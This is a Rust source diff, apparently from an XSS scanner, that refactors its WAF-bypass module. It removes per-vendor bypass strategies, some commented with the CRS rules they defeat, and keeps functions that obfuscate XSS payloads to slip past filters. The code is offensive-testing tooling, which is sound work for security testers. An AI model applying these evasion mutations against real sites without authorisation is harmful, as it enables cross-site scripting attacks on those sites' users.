@@ -1,560 +1,9 @@
-//! WAF-specific bypass strategies.
+//! Mutation implementations: each `MutationType` variant's payload rewrite.
 //!
-//! Each detected WAF type maps to a set of encoding, mutation, and evasion
-//! techniques optimized for that particular WAF.
-
-use super::WafType;
-
-/// Types of payload mutations that can be applied for WAF bypass.
-///
-/// `Display` produces a stable PascalCase name suitable for JSON keys
-/// in `target_summary.waf.bypass.mutations_applied[]`.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
-pub enum MutationType {
-    /// Insert HTML comments inside tag names: `<scr<!---->ipt>`
-    HtmlCommentSplit,
-    /// Tab/newline between tag and attribute: `<img\t\nsrc=x>`
-    WhitespaceMutation,
-    /// JavaScript comment splitting: `al/**/ert(1)`
-    JsCommentSplit,
-    /// Backtick instead of parentheses: `` alert`1` ``
-    BacktickParens,
-    /// Constructor chain: `[].constructor.constructor('alert(1)')()`
-    ConstructorChain,
-    /// Unicode escapes in JS: `\u0061lert(1)`
-    UnicodeJsEscape,
-    /// Mixed decimal/hex HTML entities
-    MixedHtmlEntities,
-    /// Alternating case for HTML tags: `<ScRiPt>`
-    CaseAlternation,
-    // ── CRS-targeting mutations ─────────────────────────────────────
-    /// Use `/` instead of space between tag and attributes: `<svg/onload=alert(1)>`
-    /// Bypasses CRS 941160 regex that expects whitespace before attributes.
-    SlashSeparator,
-    /// Replace parentheses with HTML entities: `alert&#40;1&#41;`
-    /// Bypasses CRS 941370 JS function call detection.
-    HtmlEntityParens,
-    /// SVG animate/set element execution: `<svg><animate onbegin=alert(1) attributeName=x>`
-    /// Bypasses CRS 941110 tag denylist which may not include SVG animation elements.
-    SvgAnimateExec,
-    /// Exotic whitespace chars (vertical tab 0x0B, form feed 0x0C) between tag and attrs.
-    /// Bypasses CRS 941320 tag handler regex that only checks \\s (space/tab/newline).
-    ExoticWhitespace,
-    // ── Attribute-decode-layer mutations ────────────────────────────
-    // These exploit that the HTML tokenizer decodes character references
-    // *inside attribute values* before the value is handed to the URL parser
-    // or the event-handler JS compiler. They carry strict payload-shape gates
-    // (see the mutation impls): they fire ONLY in attribute / event-handler /
-    // `javascript:`-URL context and NO-OP inside `<script>`/`<style>` raw text
-    // and in bare body-text, where no entity decoding happens.
-    /// HTML-entity-encode the first letter of a JS sink keyword in an
-    /// event-handler / `javascript:`-URL attribute value: `onerror=alert(1)` →
-    /// `onerror=&#97;lert(1)`. The tokenizer decodes `&#97;` to `a` before the
-    /// handler is compiled, so a literal-`alert` keyword regex misses it.
-    KeywordEntityEncode,
-    /// Replace EVERY top-level whitespace attribute separator in the first tag
-    /// with `/`: `<img src=x onerror=alert(1)>` → `<img/src=x/onerror=alert(1)>`.
-    /// Defeats regexes that tolerate one `/` but re-anchor on `\s` before later
-    /// attributes. Distinct from [`MutationType::SlashSeparator`] (first only).
-    MultiSlash,
-    /// Insert a numeric control-char entity (`&#9;` TAB) inside an executable
-    /// URI scheme keyword: `href=javascript:…` → `href=java&#9;script:…`. The
-    /// tokenizer decodes it to a TAB in the attribute value and the WHATWG URL
-    /// parser strips the TAB before scheme parsing, so the URL still resolves
-    /// to `javascript:` while a literal-scheme WAF regex misses it.
-    SchemeBreak,
-    /// HTML-entity-encode the leading letter of an executable URI scheme:
-    /// `href=javascript:…` → `href=&#106;avascript:…`. A different wire
-    /// signature than [`MutationType::SchemeBreak`] (entity-encode vs
-    /// control-char insertion) for the same attribute-decode mechanism.
-    EntityScheme,
-}
-
-impl std::fmt::Display for MutationType {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        let name = match self {
-            MutationType::HtmlCommentSplit => "HtmlCommentSplit",
-            MutationType::WhitespaceMutation => "WhitespaceMutation",
-            MutationType::JsCommentSplit => "JsCommentSplit",
-            MutationType::BacktickParens => "BacktickParens",
-            MutationType::ConstructorChain => "ConstructorChain",
-            MutationType::UnicodeJsEscape => "UnicodeJsEscape",
-            MutationType::MixedHtmlEntities => "MixedHtmlEntities",
-            MutationType::CaseAlternation => "CaseAlternation",
-            MutationType::SlashSeparator => "SlashSeparator",
-            MutationType::HtmlEntityParens => "HtmlEntityParens",
-            MutationType::SvgAnimateExec => "SvgAnimateExec",
-            MutationType::ExoticWhitespace => "ExoticWhitespace",
-            MutationType::KeywordEntityEncode => "KeywordEntityEncode",
-            MutationType::MultiSlash => "MultiSlash",
-            MutationType::SchemeBreak => "SchemeBreak",
-            MutationType::EntityScheme => "EntityScheme",
-        };
-        f.write_str(name)
-    }
-}
-
-/// Per-target effectiveness telemetry for the WAF bypass pass.
-///
-/// `variants_generated` records, per `MutationType`, how many distinct
-/// payload variants the mutation contributed *for this target*
-/// (post-dedup, pre-encoder). It's a "did the mutation even apply"
-/// signal — a value of 0 means the strategy declared the mutation but
-/// the target's payload set didn't shape-match any of it.
-///
-/// `bypass_requests` is the total HTTP request count sent under the
-/// active bypass strategy, and `bypass_blocks` is the subset that
-/// returned a WAF block status (403/406/429/503). The ratio gives a
-/// rough "did the bypass help" signal that surfaces alongside the
-/// detected WAF in `target_summary.waf.bypass`.
-#[derive(Debug, Default)]
-pub struct MutationStats {
-    pub variants_generated: std::sync::Mutex<std::collections::HashMap<MutationType, u64>>,
-    pub bypass_requests: std::sync::atomic::AtomicU64,
-    pub bypass_blocks: std::sync::atomic::AtomicU64,
-}
-
-impl MutationStats {
-    pub(crate) fn record_variant(&self, m: MutationType) {
-        if let Ok(mut g) = self.variants_generated.lock() {
-            *g.entry(m).or_insert(0) += 1;
-        }
-    }
-    pub(crate) fn record_request(&self, blocked: bool) {
-        self.bypass_requests
-            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
-        if blocked {
-            self.bypass_blocks
-                .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
-        }
-    }
-    pub(crate) fn snapshot(&self) -> MutationStatsSnapshot {
-        let variants = self
-            .variants_generated
-            .lock()
-            .ok()
-            .map(|g| g.clone())
-            .unwrap_or_default();
-        MutationStatsSnapshot {
-            variants,
-            bypass_requests: self
-                .bypass_requests
-                .load(std::sync::atomic::Ordering::Relaxed),
-            bypass_blocks: self
-                .bypass_blocks
-                .load(std::sync::atomic::Ordering::Relaxed),
-        }
-    }
-}
-
-/// Plain-data view of `MutationStats` suitable for JSON serialization.
-#[derive(Debug, Default, Clone)]
-pub(crate) struct MutationStatsSnapshot {
-    pub variants: std::collections::HashMap<MutationType, u64>,
-    pub bypass_requests: u64,
-    pub bypass_blocks: u64,
-}
-
-/// A bypass strategy composed of extra encoders and payload mutations.
-#[derive(Debug, Clone, Default)]
-pub(crate) struct BypassStrategy {
-    /// Extra encoder names to add beyond user-specified ones.
-    pub extra_encoders: Vec<String>,
-    /// Payload mutations to apply.
-    pub mutations: Vec<MutationType>,
-    /// Extra delay (ms) hint to avoid rate-limiting WAFs.
-    pub extra_delay_hint_ms: u64,
-}
-
-/// Get the optimal bypass strategy for a specific WAF type.
-pub(crate) fn get_bypass_strategy(waf: &WafType) -> BypassStrategy {
-    match waf {
-        WafType::Cloudflare => BypassStrategy {
-            extra_encoders: vec!["unicode".into(), "4url".into(), "zwsp".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::HtmlCommentSplit,
-                MutationType::MultiSlash,
-                MutationType::BacktickParens,
-                MutationType::SchemeBreak,
-                MutationType::EntityScheme,
-                MutationType::JsCommentSplit,
-                MutationType::CaseAlternation,
-            ],
-            extra_delay_hint_ms: 100,
-        },
-        WafType::AwsWaf => BypassStrategy {
-            extra_encoders: vec!["2url".into(), "3url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::WhitespaceMutation,
-                MutationType::MultiSlash,
-                MutationType::UnicodeJsEscape,
-                MutationType::SchemeBreak,
-                MutationType::ConstructorChain,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::Akamai => BypassStrategy {
-            extra_encoders: vec!["3url".into(), "4url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::HtmlCommentSplit,
-                MutationType::MultiSlash,
-                MutationType::SchemeBreak,
-                MutationType::ConstructorChain,
-                MutationType::CaseAlternation,
-                MutationType::BacktickParens,
-            ],
-            extra_delay_hint_ms: 50,
-        },
-        WafType::Imperva => BypassStrategy {
-            extra_encoders: vec!["zwsp".into(), "unicode".into(), "2url".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::BacktickParens,
-                MutationType::SchemeBreak,
-                MutationType::MultiSlash,
-                MutationType::JsCommentSplit,
-                MutationType::MixedHtmlEntities,
-                MutationType::UnicodeJsEscape,
-            ],
-            extra_delay_hint_ms: 100,
-        },
-        WafType::ModSecurity => BypassStrategy {
-            extra_encoders: vec!["4url".into(), "2url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::MultiSlash,
-                MutationType::HtmlCommentSplit,
-                MutationType::SchemeBreak,
-                MutationType::WhitespaceMutation,
-                MutationType::CaseAlternation,
-                MutationType::BacktickParens,
-                MutationType::ConstructorChain,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        // OWASP CRS bypass: tuned for CRS rules 941100-941380.
-        // CRS uses libinjection + regex patterns for XSS detection.
-        // Key weaknesses:
-        // - Slash-separated tag attributes bypass 941160 regex
-        // - SVG animate/set elements bypass 941110 tag denylist
-        // - HTML entity-encoded parens bypass 941370 JS function detection
-        // - Exotic whitespace (0x0B, 0x0C) bypass 941320 tag handler
-        // - Constructor chain and backtick bypass keyword-based rules
-        WafType::OwaspCrs => BypassStrategy {
-            extra_encoders: vec![
-                "unicode".into(),
-                "4url".into(),
-                "2url".into(),
-                "htmlpad".into(),
-                "zwsp".into(),
-            ],
-            mutations: vec![
-                MutationType::MultiSlash,
-                MutationType::KeywordEntityEncode,
-                MutationType::SlashSeparator,
-                MutationType::SchemeBreak,
-                MutationType::SvgAnimateExec,
-                MutationType::HtmlEntityParens,
-                MutationType::EntityScheme,
-                MutationType::ExoticWhitespace,
-                MutationType::BacktickParens,
-                MutationType::ConstructorChain,
-                MutationType::CaseAlternation,
-                MutationType::HtmlCommentSplit,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::Sucuri => BypassStrategy {
-            extra_encoders: vec!["unicode".into(), "2url".into(), "zwsp".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::BacktickParens,
-                MutationType::SchemeBreak,
-                MutationType::WhitespaceMutation,
-                MutationType::CaseAlternation,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::F5BigIp => BypassStrategy {
-            extra_encoders: vec!["3url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::HtmlCommentSplit,
-                MutationType::MultiSlash,
-                MutationType::ConstructorChain,
-                MutationType::UnicodeJsEscape,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::Barracuda => BypassStrategy {
-            extra_encoders: vec!["2url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::MixedHtmlEntities,
-                MutationType::MultiSlash,
-                MutationType::WhitespaceMutation,
-                MutationType::CaseAlternation,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::FortiWeb => BypassStrategy {
-            extra_encoders: vec!["unicode".into(), "3url".into(), "zwsp".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::HtmlCommentSplit,
-                MutationType::MultiSlash,
-                MutationType::SchemeBreak,
-                MutationType::BacktickParens,
-                MutationType::UnicodeJsEscape,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::AzureWaf => BypassStrategy {
-            extra_encoders: vec!["4url".into(), "unicode".into(), "zwsp".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::HtmlCommentSplit,
-                MutationType::MultiSlash,
-                MutationType::UnicodeJsEscape,
-                MutationType::ConstructorChain,
-            ],
-            extra_delay_hint_ms: 50,
-        },
-        WafType::CloudArmor => BypassStrategy {
-            extra_encoders: vec!["2url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::BacktickParens,
-                MutationType::MixedHtmlEntities,
-                MutationType::CaseAlternation,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::Fastly => BypassStrategy {
-            extra_encoders: vec!["3url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::WhitespaceMutation,
-                MutationType::JsCommentSplit,
-                MutationType::BacktickParens,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        WafType::Wordfence => BypassStrategy {
-            extra_encoders: vec!["2url".into(), "unicode".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::HtmlCommentSplit,
-                MutationType::CaseAlternation,
-                MutationType::BacktickParens,
-                MutationType::WhitespaceMutation,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        // NetScaler AppFirewall is signature/regex driven and keys heavily
-        // on literal tag/keyword shapes. Structural mutations that break the
-        // literal `<tag>` and `alert(` shapes (comment split, case, exotic
-        // whitespace) plus backtick calls are the highest-yield levers; pair
-        // with url/unicode encoders for its body-decoding path.
-        WafType::Citrix => BypassStrategy {
-            extra_encoders: vec!["2url".into(), "unicode".into(), "zwsp".into()],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::HtmlCommentSplit,
-                MutationType::MultiSlash,
-                MutationType::CaseAlternation,
-                MutationType::WhitespaceMutation,
-                MutationType::SchemeBreak,
-                MutationType::BacktickParens,
-            ],
-            extra_delay_hint_ms: 0,
-        },
-        // No WAF-specific mutation strategy yet; use the conservative
-        // generic strategy until fingerprint-specific bypass behavior is
-        // validated.
-        WafType::Wallarm => unknown_strategy_for("Wallarm"),
-        WafType::Naxsi => unknown_strategy_for("NAXSI"),
-        WafType::SafeLine => unknown_strategy_for("SafeLine"),
-        WafType::Unknown(hint) => unknown_strategy_for(hint),
-    }
-}
-
-/// Pick a bypass strategy for `WafType::Unknown(hint)` based on what the
-/// detector inferred about the block. Two hint shapes reach here today:
-///
-///   - `"HTTP <code>"` from `fingerprint_with_probe` when a provocation
-///     payload elicited a 403/406/429/503 but no header/body fingerprint
-///     matched. The status code carries useful intent: 429/503 means the
-///     edge is rate-limiting, 406 is content-type/encoding-driven, 403 is
-///     a generic block.
-///   - Arbitrary `--force-waf <name>` when the user supplied a name we
-///     don't recognize. Falls through to the conservative default.
-fn unknown_strategy_for(hint: &str) -> BypassStrategy {
-    let lower = hint.to_ascii_lowercase();
-    if lower.contains("429") || lower.contains("503") {
-        // Rate-limit / overload block. Keep mutation count low so we
-        // don't keep tripping the limiter; lean on a delay hint so the
-        // scan-level throttle has something to reach for.
-        return BypassStrategy {
-            extra_encoders: vec!["unicode".into(), "2url".into()],
-            mutations: vec![MutationType::CaseAlternation],
-            extra_delay_hint_ms: 1500,
-        };
-    }
-    if lower.contains("406") {
-        // Content-type / encoding-driven block. Heavier encoder mix
-        // (mutations alone won't change the wire encoding the WAF cares
-        // about); skip mutations that don't shift bytes meaningfully.
-        return BypassStrategy {
-            extra_encoders: vec![
-                "unicode".into(),
-                "2url".into(),
-                "3url".into(),
-                "4url".into(),
-            ],
-            mutations: vec![
-                MutationType::KeywordEntityEncode,
-                MutationType::MixedHtmlEntities,
-                MutationType::UnicodeJsEscape,
-                MutationType::HtmlCommentSplit,
-            ],
-            extra_delay_hint_ms: 0,
-        };
-    }
-    // Generic 403 / forced-unknown: conservative default that exercises
-    // the most common WAF weaknesses without committing to a specific
-    // vendor's behavior.
-    BypassStrategy {
-        extra_encoders: vec!["2url".into(), "unicode".into(), "zwsp".into()],
-        mutations: vec![
-            MutationType::KeywordEntityEncode,
-            MutationType::HtmlCommentSplit,
-            MutationType::MultiSlash,
-            MutationType::BacktickParens,
-            MutationType::SchemeBreak,
-            MutationType::CaseAlternation,
-            MutationType::WhitespaceMutation,
-        ],
-        extra_delay_hint_ms: 0,
-    }
-}
-
-/// Merge bypass strategies from multiple detected WAFs into a single combined strategy.
-pub(crate) fn merge_strategies(waf_types: &[&WafType]) -> BypassStrategy {
-    let mut combined = BypassStrategy::default();
-    let mut seen_encoders = std::collections::HashSet::new();
-    let mut seen_mutations = std::collections::HashSet::new();
-
-    for waf in waf_types {
-        let strategy = get_bypass_strategy(waf);
-
-        // Merge extra encoders (deduplicate via HashSet)
-        for enc in strategy.extra_encoders {
-            if !seen_encoders.contains(&enc) {
-                seen_encoders.insert(enc.clone());
-                combined.extra_encoders.push(enc);
-            }
-        }
-
-        // Merge mutations (deduplicate via HashSet)
-        for mutation in strategy.mutations {
-            if !seen_mutations.contains(&mutation) {
-                seen_mutations.insert(mutation);
-                combined.mutations.push(mutation);
-            }
-        }
-
-        // Take the max delay hint
-        combined.extra_delay_hint_ms = combined
-            .extra_delay_hint_ms
-            .max(strategy.extra_delay_hint_ms);
-    }
-
-    combined
-}
-
-/// Apply payload mutations to a list of base payloads, generating additional bypass variants.
-/// Returns the original payloads plus mutated variants.
-///
-/// The `max_variants_per_payload` parameter caps how many mutation variants are generated
-/// per base payload to prevent payload explosion.
-/// Untagged form of [`apply_mutations_tagged`]. Production takes the tagged
-/// path (it needs each variant's origin for telemetry); this stays as the
-/// shape the mutation tests assert against.
-#[cfg(test)]
-pub fn apply_mutations(
-    payloads: &[String],
-    mutations: &[MutationType],
-    max_variants_per_payload: usize,
-) -> Vec<String> {
-    apply_mutations_tagged(payloads, mutations, max_variants_per_payload)
-        .into_iter()
-        .map(|(p, _)| p)
-        .collect()
-}
-
-/// Like `apply_mutations` but also returns each output's origin: `None`
-/// for the unmodified base payload, `Some(MutationType)` for variants.
-///
-/// Callers that want to attribute scan outcomes to specific mutations
-/// (effectiveness telemetry) consume this; callers that just need the
-/// payload list use the shorter `apply_mutations`.
-pub fn apply_mutations_tagged(
-    payloads: &[String],
-    mutations: &[MutationType],
-    max_variants_per_payload: usize,
-) -> Vec<(String, Option<MutationType>)> {
-    let cap = payloads.len() * (1 + max_variants_per_payload.min(mutations.len()));
-    let mut out: Vec<(String, Option<MutationType>)> = Vec::with_capacity(cap);
-    let mut seen = std::collections::HashSet::with_capacity(cap);
-
-    for payload in payloads {
-        if seen.insert(payload.clone()) {
-            out.push((payload.clone(), None));
-        }
-
-        let mut variant_count = 0;
-        for mutation in mutations {
-            if variant_count >= max_variants_per_payload {
-                break;
-            }
-            let variant = apply_single_mutation(payload, mutation);
-            if variant != *payload && seen.insert(variant.clone()) {
-                out.push((variant, Some(*mutation)));
-                variant_count += 1;
-            }
-        }
-    }
-
-    out
-}
-
-/// Apply a single mutation type to a payload.
-fn apply_single_mutation(payload: &str, mutation: &MutationType) -> String {
-    match mutation {
-        MutationType::HtmlCommentSplit => html_comment_split(payload),
-        MutationType::WhitespaceMutation => whitespace_mutation(payload),
-        MutationType::JsCommentSplit => js_comment_split(payload),
-        MutationType::BacktickParens => backtick_parens(payload),
-        MutationType::ConstructorChain => constructor_chain(payload),
-        MutationType::UnicodeJsEscape => unicode_js_escape(payload),
-        MutationType::MixedHtmlEntities => mixed_html_entities(payload),
-        MutationType::CaseAlternation => case_alternate(payload),
-        MutationType::SlashSeparator => slash_separator(payload),
-        MutationType::HtmlEntityParens => html_entity_parens(payload),
-        MutationType::SvgAnimateExec => svg_animate_exec(payload),
-        MutationType::ExoticWhitespace => exotic_whitespace(payload),
-        MutationType::KeywordEntityEncode => keyword_entity_encode(payload),
-        MutationType::MultiSlash => multi_slash(payload),
-        MutationType::SchemeBreak => scheme_break(payload),
-        MutationType::EntityScheme => entity_scheme(payload),
-    }
-}
-
-// ── Mutation implementations ────────────────────────────────────────
+//! Grouped by technique family (HTML tag/attribute, JS call, HTML entity, URL
+//! scheme). The parent's `apply_single_mutation` dispatches to the
+//! `pub(super)` entry points here; the remaining functions are shared parsing
+//! primitives kept private to this module.
 
 /// JS sinks whose `name(...)` call shape the keyword-call mutations
 /// (`backtick_parens`, `constructor_chain`) rewrite. Kept explicit so we
@@ -576,7 +25,7 @@ const CALL_SINK_NAMES: &[&str] = &["alert", "confirm", "prompt", "print", "eval"
 /// broken JS. Reachable with user `--custom-payload` values. Every match of a
 /// keyword is scanned so a rejected substring hit does not hide a later valid
 /// call.
-fn find_sink_call(payload: &str) -> Option<(usize, usize, usize)> {
+pub(super) fn find_sink_call(payload: &str) -> Option<(usize, usize, usize)> {
     let bytes = payload.as_bytes();
     for name in CALL_SINK_NAMES {
         let needle = format!("{}(", name);
@@ -641,7 +90,7 @@ fn find_first_tag_name(payload: &str) -> Option<(usize, usize)> {
 /// Locate the first `<TAG SEP ATTR` pattern where SEP is a space or `/`
 /// and ATTR is an ASCII identifier. Returns `(tag_lower, sep_index,
 /// sep_char)` for the caller to act on. Single-pass over the payload.
-fn find_first_tag_attr_break(payload: &str) -> Option<(String, usize, char)> {
+pub(super) fn find_first_tag_attr_break(payload: &str) -> Option<(String, usize, char)> {
     let bytes = payload.as_bytes();
     let mut i = 0;
     while i < bytes.len() {
@@ -692,7 +141,7 @@ fn replace_byte_at(payload: &str, idx: usize, new_char: char) -> String {
 /// split after 2 letters and longer tags (`script`, `iframe`) split
 /// after 3 — preserves prior behavior while extending coverage to every
 /// HTML tag rather than the original 11-entry literal list.
-fn html_comment_split(payload: &str) -> String {
+pub(super) fn html_comment_split(payload: &str) -> String {
     if let Some((start, len)) = find_first_tag_name(payload) {
         let split_offset = if len >= 6 {
             3
@@ -717,7 +166,7 @@ fn html_comment_split(payload: &str) -> String {
 /// The mapping reproduces prior outputs for the tags that were already
 /// covered (svg/body → newline, details/audio → carriage return,
 /// everything else → tab) and extends "tab" to every other tag.
-fn whitespace_alt_char(tag_lower: &str, sep: char) -> char {
+pub(super) fn whitespace_alt_char(tag_lower: &str, sep: char) -> char {
     if sep == '/' {
         return '\t';
     }
@@ -731,7 +180,7 @@ fn whitespace_alt_char(tag_lower: &str, sep: char) -> char {
 /// Replace the space/slash between an HTML tag and its first attribute
 /// with a tab/newline/CR (per `whitespace_alt_char`). Mutates the first
 /// matching break in the payload.
-fn whitespace_mutation(payload: &str) -> String {
+pub(super) fn whitespace_mutation(payload: &str) -> String {
     if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
         let alt = whitespace_alt_char(&tag, sep);
         return replace_byte_at(payload, sep_idx, alt);
@@ -762,7 +211,7 @@ const JS_SINK_NAMES: &[&str] = &[
 /// per-name behavior (`al/**/ert`, `con/**/firm`, `pro/**/mpt`, …).
 /// Tries `name(` first, then `` name` `` (template-literal call form)
 /// so both `alert(1)` and `` alert`1` `` get mutated.
-fn js_comment_split(payload: &str) -> String {
+pub(super) fn js_comment_split(payload: &str) -> String {
     for name in JS_SINK_NAMES {
         if name.len() < 3 {
             continue;
@@ -824,7 +273,7 @@ fn backtick_template_body(arg: &str) -> String {
 /// `` alert`${document.domain}` ``, `alert('XSS')` → `` alert`XSS` ``.
 /// Generalised over the argument so it fires on real payloads instead of
 /// a fixed `alert(1)` / `confirm(1)` table.
-fn backtick_parens(payload: &str) -> String {
+pub(super) fn backtick_parens(payload: &str) -> String {
     if let Some((_name_start, open, close)) = find_sink_call(payload) {
         let arg = &payload[open + 1..close];
         let body = backtick_template_body(arg);
@@ -843,7 +292,7 @@ fn backtick_parens(payload: &str) -> String {
 /// avoids escaping when possible, falling back to single-quote with the
 /// inner single quotes backslash-escaped. Keeps the constructor-chain
 /// string valid even when the call argument itself is quoted.
-fn wrap_js_string(s: &str) -> String {
+pub(super) fn wrap_js_string(s: &str) -> String {
     let has_single = s.contains('\'');
     let has_double = s.contains('"');
     if !has_single {
@@ -859,7 +308,7 @@ fn wrap_js_string(s: &str) -> String {
 /// `alert(1)` → `[].constructor.constructor('alert(1)')()`. Generalised
 /// over the argument and quote-aware, so `alert('XSS')` becomes
 /// `[].constructor.constructor("alert('XSS')")()` rather than a no-op.
-fn constructor_chain(payload: &str) -> String {
+pub(super) fn constructor_chain(payload: &str) -> String {
     if let Some((name_start, _open, close)) = find_sink_call(payload) {
         let call = &payload[name_start..=close];
         let wrapped = wrap_js_string(call);
@@ -896,7 +345,7 @@ const JS_ESCAPE_NAMES: &[&str] = &[
     "top",
 ];
 
-fn unicode_js_escape(payload: &str) -> String {
+pub(super) fn unicode_js_escape(payload: &str) -> String {
     for name in JS_ESCAPE_NAMES {
         if let Some(pos) = payload.find(name) {
             let first = name.as_bytes()[0];
@@ -913,7 +362,7 @@ fn unicode_js_escape(payload: &str) -> String {
 
 /// Encode angle brackets with mixed decimal and hex HTML entities.
 /// `<` → `&#60;` (decimal), `>` → `&#x3e;` (hex)
-fn mixed_html_entities(payload: &str) -> String {
+pub(super) fn mixed_html_entities(payload: &str) -> String {
     let mut result = String::with_capacity(payload.len() * 3);
     let mut use_decimal = true;
     for c in payload.chars() {
@@ -962,7 +411,7 @@ fn mixed_html_entities(payload: &str) -> String {
 /// `/`. CRS rule 941160 expects whitespace; the slash slips past it
 /// while still being a valid attribute separator. No-op when the
 /// payload already uses `/` as the separator.
-fn slash_separator(payload: &str) -> String {
+pub(super) fn slash_separator(payload: &str) -> String {
     if let Some((_tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
         if sep == '/' {
             return payload.to_string();
@@ -975,7 +424,7 @@ fn slash_separator(payload: &str) -> String {
 /// Replace parentheses with HTML entities to bypass JS function call detection.
 /// `alert(1)` → `alert&#40;1&#41;`
 /// Also supports `&lpar;`/`&rpar;` named entities.
-fn html_entity_parens(payload: &str) -> String {
+pub(super) fn html_entity_parens(payload: &str) -> String {
     // Replace all occurrences of ( and ) with HTML decimal entities
     let mut result = payload.to_string();
     // Use &#40; for ( and &#41; for )
@@ -988,7 +437,7 @@ fn html_entity_parens(payload: &str) -> String {
 /// Generate SVG animate element-based execution payload.
 /// If the payload contains `<svg onload=X>`, transform to `<svg><animate onbegin=X attributeName=x dur=1s>`
 /// For other payloads containing event handlers, wrap in SVG animate.
-fn svg_animate_exec(payload: &str) -> String {
+pub(super) fn svg_animate_exec(payload: &str) -> String {
     // Transform svg onload variants to svg animate onbegin
     for prefix in &["<svg onload=", "<SVG ONLOAD=", "<sVg onload="] {
         if let Some(rest) = payload.strip_prefix(prefix)
@@ -1035,7 +484,7 @@ fn exotic_alt_char(tag_lower: &str, sep: char) -> char {
 
 /// Replace the separator between an HTML tag and its first attribute
 /// with an exotic whitespace char. Mutates only the first match.
-fn exotic_whitespace(payload: &str) -> String {
+pub(super) fn exotic_whitespace(payload: &str) -> String {
     if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
         let alt = exotic_alt_char(&tag, sep);
         return replace_byte_at(payload, sep_idx, alt);
@@ -1045,7 +494,7 @@ fn exotic_whitespace(payload: &str) -> String {
 
 /// Alternate the case of HTML tag characters.
 /// `<script>` → `<ScRiPt>`, `<img` → `<ImG`, `</script>` → `</ScRiPt>`
-fn case_alternate(payload: &str) -> String {
+pub(super) fn case_alternate(payload: &str) -> String {
     let mut result = String::with_capacity(payload.len());
     let mut in_tag = false;
     let mut tag_char_idx = 0u32;
@@ -1160,7 +609,7 @@ fn is_inside_rawtext_element(payload: &str, idx: usize) -> bool {
 /// keyword_len)` (keyword length excludes the trailing `:`). Returns `None`
 /// when no scheme is present, it is inside `<script>` / `<style>`, or it sits
 /// in mid-body text where no entity decode happens.
-fn find_executable_scheme(payload: &str) -> Option<(usize, usize)> {
+pub(super) fn find_executable_scheme(payload: &str) -> Option<(usize, usize)> {
     let lower = payload.to_ascii_lowercase();
     for scheme in EXECUTABLE_SCHEMES {
         let kw_len = scheme.len() - 1; // drop the trailing ':'
@@ -1239,7 +688,7 @@ fn sink_in_attr_context(payload: &str, name_start: usize) -> bool {
 /// in an attribute-decoded context. No-op inside `<script>` / `<style>`
 /// raw text (references not decoded → SyntaxError) and when the call is not in
 /// an event-handler / `javascript:`-URL context.
-fn keyword_entity_encode(payload: &str) -> String {
+pub(super) fn keyword_entity_encode(payload: &str) -> String {
     if let Some((name_start, _open, _close)) = find_sink_call(payload) {
         if is_inside_rawtext_element(payload, name_start)
             || !sink_in_attr_context(payload, name_start)
@@ -1262,7 +711,7 @@ fn keyword_entity_encode(payload: &str) -> String {
 /// (the single-separator result equals `slash_separator`'s output and would be
 /// deduped away). Whitespace inside quoted attribute values, the closing-tag
 /// `</`, and a trailing self-closing `/>` are left untouched.
-fn multi_slash(payload: &str) -> String {
+pub(super) fn multi_slash(payload: &str) -> String {
     let bytes = payload.as_bytes();
     // First opening tag: `<` directly followed by an ASCII letter.
     let mut i = 0;
@@ -1335,7 +784,7 @@ fn multi_slash(payload: &str) -> String {
 /// literal-scheme WAF regex misses it; the browser decodes the entity and the
 /// URL parser strips the TAB, so the scheme still resolves. No-op outside an
 /// executable-scheme attribute / bare-scheme context.
-fn scheme_break(payload: &str) -> String {
+pub(super) fn scheme_break(payload: &str) -> String {
     if let Some((start, kw_len)) = find_executable_scheme(payload) {
         // Split inside the keyword (e.g. after "java" in "javascript").
         let off = (kw_len / 2).clamp(2, 4);
@@ -1353,7 +802,7 @@ fn scheme_break(payload: &str) -> String {
 /// (`javascript:` → `&#106;avascript:`). A distinct wire signature from
 /// [`scheme_break`] for the same attribute-decode mechanism. No-op outside an
 /// executable-scheme attribute / bare-scheme context.
-fn entity_scheme(payload: &str) -> String {
+pub(super) fn entity_scheme(payload: &str) -> String {
     if let Some((start, _kw_len)) = find_executable_scheme(payload) {
         let first = payload.as_bytes()[start]; // ASCII letter (j / v)
         let esc = format!("&#{};", first as u32);
@@ -1365,6 +814,3 @@ fn entity_scheme(payload: &str) -> String {
     }
     payload.to_string()
 }
-
-#[cfg(test)]
-mod tests;
